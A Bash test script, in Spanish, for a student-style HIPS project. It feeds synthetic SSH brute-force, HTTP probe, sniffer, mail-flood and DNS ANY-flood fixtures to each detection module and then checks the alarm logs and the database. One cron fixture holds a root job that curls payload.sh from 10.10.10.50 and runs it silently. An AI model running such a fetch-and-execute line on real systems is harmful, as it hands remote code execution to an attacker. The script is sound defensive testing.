#!/bin/bash

PROJECT_DIR="/home/hector/hips-project"
EVIDENCE_DIR="$PROJECT_DIR/docs/test_evidence"
PYTHON="$PROJECT_DIR/venv/bin/python"

cd "$PROJECT_DIR" || exit 1

echo "===== FASE 12 - PRUEBAS FINALES HIPS ====="
echo "Fecha: $(date)"
echo

echo "===== 1. VERIFICACION DE SINTAXIS PYTHON ====="
$PYTHON -m py_compile alerts/logger.py alerts/mailer.py
$PYTHON -m py_compile db/connection.py db/repository.py
$PYTHON -m py_compile prevention/*.py
$PYTHON -m py_compile detection/*.py
$PYTHON -m py_compile web/app.py
echo "Sintaxis Python: OK"
echo

echo "===== 2. ACCESS MONITOR ====="
cat > /tmp/secure_access_test.log <<'EOF'
Jun 26 13:00:01 localhost sshd[1001]: Failed password for invalid user test1 from 10.10.10.50 port 50001 ssh2
Jun 26 13:00:02 localhost sshd[1002]: Failed password for invalid user test2 from 10.10.10.50 port 50002 ssh2
Jun 26 13:00:03 localhost sshd[1003]: Failed password for invalid user test3 from 10.10.10.50 port 50003 ssh2
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.access_monitor \
--log /tmp/secure_access_test.log \
--threshold 3 \
--window 10 \
--prevent
echo

echo "===== 3. FILE INTEGRITY ====="
echo "contenido inicial" > /tmp/hips_fim_phase12.txt

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.file_integrity \
--init-baseline \
--baseline /tmp/hips_fim_phase12_baseline.json \
--paths /tmp/hips_fim_phase12.txt

echo "cambio sospechoso" >> /tmp/hips_fim_phase12.txt

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.file_integrity \
--baseline /tmp/hips_fim_phase12_baseline.json \
--paths /tmp/hips_fim_phase12.txt \
--prevent
echo

echo "===== 4. USERS MONITOR ====="
cat > /tmp/who_phase12.txt <<'EOF'
intruso pts/2 2026-06-26 13:10 (10.10.10.50)
hector pts/1 2026-06-26 13:11 (192.168.56.1)
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.users_monitor \
--sample-file /tmp/who_phase12.txt \
--start-hour 0 \
--end-hour 0 \
--prevent
echo

echo "===== 5. SNIFFER DETECT ====="
cat > /tmp/ps_sniffer_phase12.txt <<'EOF'
1234 tcpdump tcpdump -i enp0s3 -n
2345 bash bash
3456 wireshark wireshark
EOF

cat > /tmp/ip_link_promisc_phase12.txt <<'EOF'
2: enp0s3: <BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.sniffer_detect \
--sample-ps /tmp/ps_sniffer_phase12.txt \
--sample-ip-link /tmp/ip_link_promisc_phase12.txt \
--prevent \
--disable-promisc
echo

echo "===== 6. LOG ANALYZER ====="
cat > /tmp/secure_log_analyzer_phase12.log <<'EOF'
Jun 26 13:20:01 localhost sshd[1001]: Failed password for invalid user test1 from 10.10.10.51 port 50001 ssh2
Jun 26 13:20:02 localhost sshd[1002]: Failed password for invalid user test2 from 10.10.10.51 port 50002 ssh2
Jun 26 13:20:03 localhost sshd[1003]: Failed password for invalid user test3 from 10.10.10.51 port 50003 ssh2
Jun 26 13:20:04 localhost sshd[1004]: Failed password for invalid user test4 from 10.10.10.51 port 50004 ssh2
Jun 26 13:20:05 localhost sshd[1005]: Failed password for invalid user test5 from 10.10.10.51 port 50005 ssh2
Jun 26 13:20:06 localhost sshd[1006]: Invalid user admin from 10.10.10.51 port 50006
Jun 26 13:20:07 localhost sshd[1007]: Invalid user oracle from 10.10.10.51 port 50007
Jun 26 13:20:08 localhost sshd[1008]: Invalid user postgres from 10.10.10.51 port 50008
EOF

cat > /tmp/http_access_phase12.log <<'EOF'
10.10.10.60 - - [26/Jun/2026:13:21:01 -0300] "GET /admin HTTP/1.1" 404 123
10.10.10.60 - - [26/Jun/2026:13:21:02 -0300] "GET /phpmyadmin HTTP/1.1" 404 123
10.10.10.60 - - [26/Jun/2026:13:21:03 -0300] "GET /.env HTTP/1.1" 403 123
10.10.10.60 - - [26/Jun/2026:13:21:04 -0300] "GET /wp-login.php HTTP/1.1" 404 123
10.10.10.60 - - [26/Jun/2026:13:21:05 -0300] "GET /server-status HTTP/1.1" 403 123
EOF

cat > /tmp/maillog_phase12.log <<'EOF'
Jun 26 13:22:01 localhost postfix/qmgr[111]: A1: from=<spamuser@example.com>, size=1000
Jun 26 13:22:02 localhost postfix/qmgr[111]: A2: from=<spamuser@example.com>, size=1000
Jun 26 13:22:03 localhost postfix/qmgr[111]: A3: from=<spamuser@example.com>, size=1000
Jun 26 13:22:04 localhost postfix/qmgr[111]: A4: from=<spamuser@example.com>, size=1000
Jun 26 13:22:05 localhost postfix/qmgr[111]: A5: from=<spamuser@example.com>, size=1000
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.log_analyzer \
--secure-log /tmp/secure_log_analyzer_phase12.log \
--messages-log /tmp/no_messages_phase12.log \
--http-access-log /tmp/http_access_phase12.log \
--maillog /tmp/maillog_phase12.log \
--auth-threshold 5 \
--auth-window 10 \
--http-threshold 5 \
--mail-threshold 5 \
--prevent
echo

echo "===== 7. PROCESS MONITOR ====="
cat > /tmp/ps_process_phase12.txt <<'EOF'
1234 nobody suspicious 85.5 00:05:00 /tmp/suspicious --work
2345 hector bash 1.2 01:00:00 bash
3456 nobody miner 92.0 00:10:00 /tmp/miner
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.process_monitor \
--sample-file /tmp/ps_process_phase12.txt \
--state-file /tmp/process_state_phase12.json \
--memory-threshold 70 \
--min-duration 0 \
--prevent
echo

echo "===== 8. TMP MONITOR ====="
mkdir -p /tmp/hips_tmp_phase12

cat > /tmp/hips_tmp_phase12/.xpayload123.sh <<'EOF'
#!/bin/bash
echo "prueba sospechosa"
EOF

chmod +x /tmp/hips_tmp_phase12/.xpayload123.sh

cat > /tmp/ps_tmp_phase12.txt <<'EOF'
4444 nobody suspicious /tmp/hips_tmp_phase12/.xpayload123.sh
5555 hector bash bash
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.tmp_monitor \
--tmp-dir /tmp/hips_tmp_phase12 \
--sample-ps /tmp/ps_tmp_phase12.txt \
--prevent
echo

echo "===== 9. CRON MONITOR ====="
mkdir -p /tmp/cron_phase12

cat > /tmp/cron_phase12/payload_job <<'EOF'
* * * * * root curl http://10.10.10.50/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh >/dev/null 2>&1
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.cron_monitor \
--cron-path /tmp/cron_phase12 \
--prevent
echo

echo "===== 10. DDOS DETECT ====="
cat > /tmp/dns_ddos_phase12.log <<'EOF'
Jun 26 13:40:01 localhost named[100]: client 10.10.10.80#50001 (victima.com): query: victima.com IN A +E
Jun 26 13:40:02 localhost named[100]: client 10.10.10.80#50002 (victima.com): query: victima.com IN A +E
Jun 26 13:40:03 localhost named[100]: client 10.10.10.80#50003 (victima.com): query: victima.com IN A +E
Jun 26 13:40:04 localhost named[100]: client 10.10.10.80#50004 (victima.com): query: victima.com IN A +E
Jun 26 13:40:05 localhost named[100]: client 10.10.10.80#50005 (victima.com): query: victima.com IN A +E
Jun 26 13:40:06 localhost named[100]: client 10.10.10.90#50101 (victima.com): query: victima.com IN ANY +E
Jun 26 13:40:07 localhost named[100]: client 10.10.10.90#50102 (victima.com): query: victima.com IN ANY +E
Jun 26 13:40:08 localhost named[100]: client 10.10.10.90#50103 (victima.com): query: victima.com IN ANY +E
Jun 26 13:40:09 localhost named[100]: client 10.10.10.90#50104 (victima.com): query: victima.com IN ANY +E
Jun 26 13:40:10 localhost named[100]: client 10.10.10.90#50105 (victima.com): query: victima.com IN ANY +E
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.ddos_detect \
--log /tmp/dns_ddos_phase12.log \
--ip-threshold 5 \
--any-threshold 5 \
--global-threshold 10 \
--window 60 \
--prevent
echo

echo "===== 11. MAIL QUEUE ====="
cat > /tmp/mail_queue_phase12.txt <<'EOF'
-Queue ID-  --Size-- ----Arrival Time---- -Sender/Recipient-------
A1B2C3D4E5     2048 Fri Jun 26 13:50:01 spamuser@example.com
                                         user1@example.com
B1B2C3D4E5     2048 Fri Jun 26 13:50:02 spamuser@example.com
                                         user2@example.com
C1B2C3D4E5     2048 Fri Jun 26 13:50:03 spamuser@example.com
                                         user3@example.com
D1B2C3D4E5     2048 Fri Jun 26 13:50:04 spamuser@example.com
                                         user4@example.com
E1B2C3D4E5     2048 Fri Jun 26 13:50:05 spamuser@example.com
                                         user5@example.com
F1B2C3D4E5     2048 Fri Jun 26 13:50:06 other@example.com
                                         user6@example.com
G1B2C3D4E5     2048 Fri Jun 26 13:50:07 other@example.com
                                         user7@example.com
-- 14 Kbytes in 7 Requests.
EOF

sudo env PYTHONPATH="$PROJECT_DIR" "$PYTHON" \
-m detection.mail_queue \
--sample-file /tmp/mail_queue_phase12.txt \
--queue-threshold 7 \
--sender-threshold 5 \
--size-threshold-kb 100 \
--prevent
echo

echo "===== 12. ULTIMAS ALARMAS EN LOG ====="
sudo tail -n 40 /var/log/hips/alarmas.log
echo

echo "===== 13. ULTIMAS PREVENCIONES EN LOG ====="
sudo tail -n 40 /var/log/hips/prevencion.log
echo

echo "===== 14. ULTIMOS EMAILS GENERADOS ====="
sudo tail -n 40 /var/log/hips/emails.log
echo

echo "===== 15. ULTIMAS ALARMAS EN POSTGRESQL ====="
sudo -u postgres psql -d hips_db -c "SELECT id, timestamp, tipo_alarma, ip_origen, modulo FROM alarmas ORDER BY id DESC LIMIT 20;"
echo

echo "===== 16. ULTIMAS PREVENCIONES EN POSTGRESQL ====="
sudo -u postgres psql -d hips_db -c "SELECT id, timestamp, tipo_alarma, ip_origen, accion, resultado FROM acciones_prevencion ORDER BY id DESC LIMIT 20;"
echo

echo "===== FIN FASE 12 ====="
